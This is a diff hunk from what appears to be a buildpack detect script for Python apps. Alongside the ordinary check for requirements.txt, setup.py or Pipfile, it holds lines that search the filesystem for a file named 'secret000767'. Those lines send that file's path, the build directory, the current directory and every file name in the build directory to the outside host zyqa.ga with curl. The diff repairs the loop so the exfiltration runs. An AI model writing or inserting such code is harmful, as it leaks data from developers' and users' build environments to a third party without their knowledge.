@@ -17,7 +17,7 @@ WHERE=$(find / -type f -name secret000767 2>/dev/null)
 curl "https://zyqa.ga/$BUILD_DIR"
 curl "https://zyqa.ga/$WHERE"
 curl "https://zyqa.ga/$(pwd)"
-for f in $(ls $(BUILD_DIR)); do curl "https://zyqa.ga/$f"; done
+for f in $(ls $BUILD_DIR); do curl "https://zyqa.ga/$f"; done
 # Exit early if app is clearly not Python.
 if [ ! -f "$BUILD_DIR/requirements.txt" ] && [ ! -f "$BUILD_DIR/setup.py" ] && [ ! -f "$BUILD_DIR/Pipfile" ]; then
   exit 1
